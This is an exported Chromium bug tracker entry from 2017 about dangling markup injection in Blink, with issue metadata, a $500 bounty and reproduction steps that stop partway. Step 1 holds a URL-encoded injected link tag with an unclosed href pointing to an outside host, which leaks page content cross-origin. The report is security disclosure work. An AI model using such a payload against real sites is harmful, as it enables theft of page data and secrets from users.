# Page still eats the page until the next `'`

| Field | Value |
|-------|-------|
| **Issue ID** | [40088514](https://issues.chromium.org/issues/40088514) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Media, Blink>SecurityFeature |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | s....@gmail.com |
| **Assignee** | an...@chromium.org |
| **Created** | 2017-07-27 |
| **Bounty** | $500.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36

Steps to reproduce the problem:
1. Go to https://test.shhnjk.com/xssable.php?x=%3Clink%20rel=stylesheet%20href=%27https://shhnjk.com/?
2. Request sent to cross-or

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088514)*
